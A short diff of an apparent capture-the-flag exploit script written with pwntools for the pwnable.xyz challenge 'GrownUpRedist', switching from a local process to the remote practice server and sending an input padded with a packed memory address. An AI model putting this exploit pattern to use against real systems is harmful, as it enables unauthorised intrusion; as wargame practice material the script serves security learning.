@@ -1,7 +1,7 @@
 from pwn import *
 
-p = process('./GrownUpRedist')
-# p = remote('svc.pwnable.xyz', 30004)
+# p = process('./GrownUpRedist')
+p = remote('svc.pwnable.xyz', 30004)
 
 p.recvuntil('Are you 18 years or older? [y/N]:')
 p.send('YYYYYYYY' + p64(0x601080))
